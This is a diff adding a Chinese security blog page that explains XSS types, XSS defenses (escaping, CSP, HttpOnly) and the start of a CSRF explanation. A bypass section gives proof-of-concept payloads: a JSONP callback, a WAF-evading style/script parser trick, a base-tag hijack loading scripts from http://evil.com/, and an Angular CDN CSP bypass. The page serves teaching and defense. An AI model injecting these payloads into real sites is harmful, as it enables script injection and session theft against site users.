@@ -1,0 +1,1038 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/candy.png">
+  <link rel="icon" href="/img/candy.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1b1b26">
+  <meta name="author" content="Candy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言emmmm…..学习安全也有很长一段时间了，我都没有对这两个漏洞进行过深入的研究（说白了，我就是看不起这两个漏洞，不能 rce 就算了，想要实现信息获取还得靠钓鱼，那我为啥不直接写免杀马钓鱼呢？回答我……） 然而，人在屋檐下，不得不低头，该学的还是得学….. 跨站脚本攻击（XSS, Cross-Site Scripting）1. 基础概念XSS（跨站脚本攻击，Cross-Site Script">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入研究前端漏洞安全（XSS、CSRF）">
+<meta property="og:url" content="http://candyb0x.github.io/2025/12/24/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E5%AE%89%E5%85%A8%EF%BC%88XSS%E3%80%81CSRF%EF%BC%89/index.html">
+<meta property="og:site_name" content="Welcome Candy Box">
+<meta property="og:description" content="前言emmmm…..学习安全也有很长一段时间了，我都没有对这两个漏洞进行过深入的研究（说白了，我就是看不起这两个漏洞，不能 rce 就算了，想要实现信息获取还得靠钓鱼，那我为啥不直接写免杀马钓鱼呢？回答我……） 然而，人在屋檐下，不得不低头，该学的还是得学….. 跨站脚本攻击（XSS, Cross-Site Scripting）1. 基础概念XSS（跨站脚本攻击，Cross-Site Script">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1729563517778-dc9ae6be-2cf1-4aff-92d9-0c7567c2cc24-20251224215009304.png">
+<meta property="article:published_time" content="2025-12-24T13:47:36.000Z">
+<meta property="article:modified_time" content="2025-12-24T13:50:25.187Z">
+<meta property="article:author" content="Candy">
+<meta property="article:tag" content="攻防渗透">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CSRF">
+<meta property="article:tag" content="前端安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1729563517778-dc9ae6be-2cf1-4aff-92d9-0c7567c2cc24-20251224215009304.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>深入研究前端漏洞安全（XSS、CSRF） - Welcome Candy Box</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"candyb0x.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Candy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/essay/" target="_self">
+                <i class="iconfont icon-note"></i>
+                <span>随笔</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Bannerimg.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="深入研究前端漏洞安全（XSS、CSRF）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Candy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-24 21:47" pubdate>
+          2025年12月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          51 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">深入研究前端漏洞安全（XSS、CSRF）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmmm…..学习安全也有很长一段时间了，我都没有对这两个漏洞进行过深入的研究（说白了，我就是看不起这两个漏洞，不能 rce 就算了，想要实现信息获取还得靠钓鱼，那我为啥不直接写免杀马钓鱼呢？回答我……）</p>
+<p>然而，人在屋檐下，不得不低头，该学的还是得学…..</p>
+<h1 id="跨站脚本攻击（XSS-Cross-Site-Scripting）"><a href="#跨站脚本攻击（XSS-Cross-Site-Scripting）" class="headerlink" title="跨站脚本攻击（XSS, Cross-Site Scripting）"></a>跨站脚本攻击（XSS, Cross-Site Scripting）</h1><h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><p><strong>XSS（跨站脚本攻击，Cross-Site Scripting）</strong> 是一种常见的Web安全漏洞，攻击者通过注入恶意脚本到网页中，使得其他用户在浏览时执行这些脚本，从而<strong>窃取用户数据、劫持会话或破坏页面功能</strong>。</p>
+<h2 id="2-XSS-漏洞分类"><a href="#2-XSS-漏洞分类" class="headerlink" title="2. XSS 漏洞分类"></a>2. XSS 漏洞分类</h2><h3 id="2-1-反射型-XSS"><a href="#2-1-反射型-XSS" class="headerlink" title="2.1 反射型 XSS"></a>2.1 反射型 XSS</h3><p><strong>定义</strong>：指恶意脚本作为请求的一部分发送给服务器，服务器将该脚本“反射”回用户的浏览器，导致脚本执行。恶意代码不会存储在服务器的数据库中。</p>
+<p>攻击场景：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://example.com/search?query=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>若页面直接显示<code>query</code>参数内容且未转义，则会执行脚本。</p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p><strong>非持久性：</strong> 攻击是一次性的。</p>
+</li>
+<li><p><strong>触发方式：</strong> 需要诱导受害者点击特定的恶意链接（Payload 通常包含在 URL 参数中）。</p>
+</li>
+<li><p><strong>交互流程：</strong> 用户 -&gt; 服务器 -&gt; 用户。</p>
+</li>
+</ul>
+<h3 id="2-2-存储型-XSS"><a href="#2-2-存储型-XSS" class="headerlink" title="2.2 存储型 XSS"></a>2.2 存储型 XSS</h3><p><strong>定义</strong>：指恶意脚本被永久存储在目标服务器的数据库、文件系统或缓存中。当受害者访问包含该恶意数据的页面时，脚本会被自动提取并执行。</p>
+<p>攻击场景：攻击者在论坛发帖、博客留言或用户简介中插入恶意脚本。该内容被保存到数据库。之后任何访问该帖子的用户，浏览器都会加载并执行这段脚本。</p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p><strong>持久性：</strong> 危害最大，不需要诱导用户点击特定链接，只要访问正常页面即可中招。</p>
+</li>
+<li><p><strong>触发方式：</strong> 受害者主动访问被污染的页面。</p>
+</li>
+<li><p><strong>交互流程：</strong> 攻击者 -&gt; 服务器（存储）-&gt; 受害者。</p>
+</li>
+</ul>
+<h3 id="2-3-DOM-型-XSS"><a href="#2-3-DOM-型-XSS" class="headerlink" title="2.3 DOM 型 XSS"></a>2.3 DOM 型 XSS</h3><p><strong>定义</strong>：DOM 型 XSS 是一种特殊的 XSS，其漏洞完全存在于客户端代码（JavaScript）中。服务器返回的页面可能是正常的，但客户端脚本在处理用户输入（如 URL 片段、Referer 等）时，不安全地修改了页面的 DOM 结构，导致恶意脚本执行。</p>
+<p>攻击场景：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 从URL中获取参数并写入页面</span><br><span class="hljs-keyword">const</span> userInput = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;output&quot;</span>).<span class="hljs-property">innerHTML</span> = userInput;<br></code></pre></td></tr></table></figure>
+
+<p>若URL链接为<code>http://example.com/test#&lt;img src=x onerror=alert(1)&gt;</code>，则客户端处理URL则会导致XSS漏洞的产生。</p>
+<p><strong>特点：</strong></p>
+<ul>
+<li><p><strong>纯客户端行为：</strong> 恶意代码不需要经过服务器的解析或反射（虽然代码本身可能来自服务器，但漏洞逻辑在前端）。</p>
+</li>
+<li><p><strong>触发方式：</strong> 通过修改 URL 的 <code>#</code> (hash) 部分或其他客户端输入源。</p>
+</li>
+<li><p><strong>核心机制：</strong> 数据流从 <strong>Source</strong>（输入点，如 <code>location.search</code>）流向 <strong>Sink</strong>（执行点，如 <code>document.write</code> 或 <code>innerHTML</code>）。</p>
+</li>
+</ul>
+<h2 id="3-XSS-防御方案"><a href="#3-XSS-防御方案" class="headerlink" title="3. XSS 防御方案"></a>3. XSS 防御方案</h2><h3 id="3-1-输入验证与过滤"><a href="#3-1-输入验证与过滤" class="headerlink" title="3.1 输入验证与过滤"></a>3.1 输入验证与过滤</h3><p>这应该是我们首先能够想到的最为简单的防御方案，但是这个防御方案具有天生的弊端，那就是如何避免正常的消息也被检测识别为恶意内容。</p>
+<p>例如：在论坛、评论、留言等一些场景中，天然就需要输入一些违规字符去表达我们的思想或者存在的问题，在这些场景中想要通过输入验证和过滤的方式去规避 XSS 攻击明显就是不科学的。</p>
+<h3 id="3-2-输出编码（转义）"><a href="#3-2-输出编码（转义）" class="headerlink" title="3.2 输出编码（转义）"></a>3.2 输出编码（转义）</h3><p>这是目前运用较为广泛的一种避免 XSS 的方式，使用这种方式最大的优点就是能够让用户想要输出的内容正常显示且不会将这些内容当成<code>javascript</code>代码执行导致 XSS 攻击。</p>
+<p>主要的实现方式就是将浏览器输出的内容都转变成“文本数据”，对特殊符号编码为**HTML实体(Entity)**，如此浏览器解析器就会将特殊符号当作文本内容进行处理，而不是作为语法结构相关的内容进行处理。</p>
+<p>具体的防御方案可以参考如下的函数实现：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeHTML</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">return</span> str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[&amp;&lt;&gt;&quot;&#x27;\/]/g</span>, <span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> (&#123;<br>    <span class="hljs-string">&#x27;&amp;&#x27;</span>: <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&lt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&gt;&#x27;</span>: <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;&quot;&#x27;</span>: <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>,<br>    <span class="hljs-string">&quot;&#x27;&quot;</span>: <span class="hljs-string">&#x27;&amp;#39;&#x27;</span>,<br>    <span class="hljs-string">&quot;/&quot;</span>: <span class="hljs-string">&#x27;&amp;#x2F;&#x27;</span><br>  &#125;[m]));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这种防御方式在一些特定的场景下是不会采用的，那就是必须支持http解析执行的场景，例如：邮件。</p>
+<h3 id="3-3-内容安全策略（CSP）"><a href="#3-3-内容安全策略（CSP）" class="headerlink" title="3.3 内容安全策略（CSP）"></a>3.3 内容安全策略（CSP）</h3><p>在没有 CSP 的情况下，浏览器遵守<strong>同源策略</strong>。虽然同源策略避免了浏览器读取读取非同源网站数据的问题，但是同源策略允许嵌入内容，例如：<code>&lt;script src=&quot;...&quot;&gt;</code>, <code>&lt;img src=&quot;...&quot;&gt;</code>, <code>&lt;link href=&quot;...&quot;&gt;</code>, <code>&lt;iframe src=&quot;...&quot;&gt;</code>。因此，仍然会产生xss漏洞。</p>
+<p><strong>内容安全策略(CSP)</strong> 通过 HTTP 响应头 (Header) 给浏览器发一份“白名单”。浏览器在加载资源或执行代码前，必须先核对这份名单。</p>
+<p>内容安全策略主要设计三个方面的内容：</p>
+<ol>
+<li>脚本来源限制<br> CSP 最基础的功能，组织浏览器“加载任意URL”的内容，强制浏览器只能从受信任的服务器下载脚本文件内容。</li>
+<li>禁止内联代码<br> CSP 防御 XSS 攻击最核心的内容，CSP 会默认阻止内联代码(unsafe-inline)执行从而防御 XSS攻击。<br> CSP 的默认策略是完全进行内联代码执行的，因此 CSP 策略不应该包含<code>unsafe-inline</code>。 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 这是不安全的配置，不要带有&#x27;unsafe-inline&#x27;才是安全的</span><br><span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Security</span>-<span class="hljs-title class_">Policy</span>: script-src <span class="hljs-string">&#x27;self&#x27;</span> <span class="hljs-string">&#x27;unsafe-inline&#x27;</span>;<br></code></pre></td></tr></table></figure></li>
+<li>禁用危险函数与插件<br> 即使阻止内联代码执行，攻击者依然可以通过<code>eval()</code>和一些陈旧的插件实现 XSS 攻击，最好的方式则是禁用危险函数和相关插件的内容。<br> CSP是默认禁止<code>eval()</code>函数的执行的，因此 CSP 策略不应该包含<code>unsafe-eval</code>关键字。<br> 通过<code>object-src &#39;none&#39;</code>禁止所有的插件，彻底禁用 <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code>, <code>&lt;applet&gt;</code> 标签。</li>
+</ol>
+<p>一个比较好的防御 XSS 攻击的 CSP 响应头</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted-cdn.com; object-src &#x27;none&#x27;; base-uri &#x27;self&#x27;;<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-4-HttpOnly-Cookie"><a href="#3-4-HttpOnly-Cookie" class="headerlink" title="3.4 HttpOnly Cookie"></a>3.4 HttpOnly Cookie</h3><p>该防御方案的主要目的不是为了防止 XSS 攻击，而是防止 XSS 窃取信息内容。</p>
+<p>Http Only 通过在 HTTP 响应头中给 Cookie 加上Http Only 的标记，明确告知浏览器该 Cookie 仅能用户 HTTP 请求传输，无法通过 js 脚本获取，从而保证 Cookie 泄露的问题。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>session_id=xyz123; Secure; HttpOnly<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-5-避免危险-API"><a href="#3-5-避免危险-API" class="headerlink" title="3.5 避免危险 API"></a>3.5 避免危险 API</h3><p>该防御方案主要针对的是 DOM 型 XSS 漏洞，防御的核心在于强制浏览器创建“文本节点”而非“元素节点”。</p>
+<p>一些常见的禁用和替代方式如下：</p>
+<ul>
+<li><code>innerHTML</code> → 改用 <code>textContent</code>。</li>
+<li><code>document.write()</code> → 改用DOM操作API。</li>
+<li><code>eval()</code> → 改用 <code>JSON.parse()</code>。</li>
+</ul>
+<h2 id="4-XSS-攻击-bypass"><a href="#4-XSS-攻击-bypass" class="headerlink" title="4. XSS 攻击 bypass"></a>4. XSS 攻击 bypass</h2><p>对于目前一些常见的 XSS 攻击方式基本已经无法生效，根本原因在于上述提到的防御方式已经把一些基本的 XSS 语句全部拦截下来。</p>
+<p>如果仍然存在一些畸形的 XSS 语句没能够成功拦截，配合 waf 也已经能够将普通的 XSS 攻击给拦截下来。</p>
+<p>因此，下面就讨论的内容肯定不是纯粹的 XSS 攻击的内容，必要时会讨论多种漏洞协同实现 XSS 攻击。</p>
+<h3 id="4-1-JSONP劫持-bypass-CSP"><a href="#4-1-JSONP劫持-bypass-CSP" class="headerlink" title="4.1 JSONP劫持 bypass CSP"></a>4.1 JSONP劫持 bypass CSP</h3><p>利用后端存在的 JSONP 劫持漏洞使用 XSS 攻击。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://example.com/manifest.jsonp?callback=a=alert,a();&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-2-利用解析器容错-bypass-WAF"><a href="#4-2-利用解析器容错-bypass-WAF" class="headerlink" title="4.2 利用解析器容错 bypass WAF"></a>4.2 利用解析器容错 bypass WAF</h3><p>以下的的语句能够成功实现 XSS 攻击，但是从 WAF 的角度看来，这可能只是一个正常的 CSS 语句内容；</p>
+<p>这个语句能够成功解析的主要原因在于HTML解析器具有极强的容器性，也可以理解为HTML解析优先级高于CSS，因此当HTML解析器识别到<code>&lt;/style</code>则将其当成一个结束标签闭合再此之前的<code>&lt;style&gt;</code>，并将后面的<code>/x&gt;</code>当前垃圾字符抛弃。因此为后面的 XSS 攻击语句的执行创造了条件。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-xml">@import url(&#x27;#theme&lt;/style/x&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(916)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>&lt;style/x&gt;.css&#x27;);</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-3-Base-URI劫持-bypass-CSP"><a href="#4-3-Base-URI劫持-bypass-CSP" class="headerlink" title="4.3 Base-URI劫持 bypass CSP"></a>4.3 Base-URI劫持 bypass CSP</h3><p>如果 CSP 没有配置 base-uri 指令，攻击者可以通过注入<code>&lt;base&gt;</code>标签来改变页面上所有相对路径脚本的加载源。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://evil.com/&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/app.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="4-4-利用-CDN-的静态资源-Static-Bypass"><a href="#4-4-利用-CDN-的静态资源-Static-Bypass" class="headerlink" title="4.4 利用 CDN 的静态资源 (Static Bypass)"></a>4.4 利用 CDN 的静态资源 (Static Bypass)</h3><p>很多网站为了方便，会在 CSP 里放行公共 CDN，如 <code>script-src &#39;self&#39; https://cdnjs.cloudflare.com</code>。</p>
+<p><strong>Payload:</strong> 攻击者去 CDN 上找一个<strong>已知的、旧版本的、包含漏洞的库</strong>（比如旧版 Angular 或 jQuery），或者找一个本身就支持 JSONP 的库。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ng-app</span> <span class="hljs-attr">ng-csp</span>&gt;</span>&#123;&#123; $on.curry.call().alert(1) &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>目前 XSS 漏洞广泛存在与市面上各大厂商的互联网服务中，包括各大头部厂商，该漏洞的危害和利用主要是源于Cookie窃取和恶意钓鱼。</p>
+<p>在攻防对抗场景中，XSS 漏洞十分鸡肋，通过钓鱼实现 Cookie 获取，拿到指定网站的后台权限，远不及通过免杀木马调用实现的机器权限获取的用处大。</p>
+<p>XSS 漏洞钓鱼与免杀木马钓鱼对比，XSS 漏洞钓鱼的成功率肯定比免杀木马钓鱼成功率更高，XSS 漏洞钓鱼只需要用户点击相应的链接即可实现 Cookie 获取，获得用户权限；而免杀木马钓鱼不仅需要用户下载指定程序执行，还需要考虑对抗杀软和 EDR 及其相关的内容。</p>
+<p>现在简单解释一下为什么市面上仍存在大量 XSS 漏洞的原因。在我看来，XSS 漏洞存在的根本原因在于HTML解析的必要性，肯定存在场景需要HTML的解析，当允许HTML解析的情况下，对于CSP配置不到位就会导致XSS漏洞的产生。除此之外，即使CSP配置到位，仅允许白名单解析，WAF也已经配置的情况下，仍然能够通过WAF绕过+白名单域名下存在的JSONP劫持回调函数实现XSS漏洞。</p>
+<p>综上所述，XSS漏洞的预防并不是单一漏洞问题，而是多个组件的协同配合预防XSS漏洞的产生，只要仍然需要HTML解析，XSS漏洞就可能会存在（只不过还没有被发现而已）。</p>
+<h1 id="跨站请求伪造漏洞（CSRF-Cross-Site-Request-Forgery）"><a href="#跨站请求伪造漏洞（CSRF-Cross-Site-Request-Forgery）" class="headerlink" title="跨站请求伪造漏洞（CSRF, Cross-Site Request Forgery）"></a>跨站请求伪造漏洞（CSRF, Cross-Site Request Forgery）</h1><h2 id="1-基础概念-1"><a href="#1-基础概念-1" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><p><strong>CSRF（跨站请求伪造，Cross-Site Request Forgery）</strong> 是一种网络攻击方式，攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证（如 Cookie），绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p>
+<p>通俗来讲，就是攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<h2 id="2-攻击原理与流程"><a href="#2-攻击原理与流程" class="headerlink" title="2. 攻击原理与流程"></a>2. 攻击原理与流程</h2><p>一个典型的 CSRF 攻击有着如下的流程：</p>
+<ol>
+<li>受害者登录 <code>a.com</code>，并保留了登录凭证（Cookie）。</li>
+<li>攻击者引诱受害者访问了 <code>b.com</code>。</li>
+<li><code>b.com</code> 向 <code>a.com</code> 发送了一个请求：<code>a.com/act=xx</code>。浏览器会默认携带 <code>a.com</code> 的 Cookie。</li>
+<li><code>a.com</code> 接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</li>
+<li><code>a.com</code> 以受害者的名义执行了 <code>act=xx</code>。</li>
+<li>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让 <code>a.com</code> 执行了自己定义的操作。</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/uPic/1729563517778-dc9ae6be-2cf1-4aff-92d9-0c7567c2cc24-20251224215009304.png" srcset="/img/loading.gif" lazyload></p>
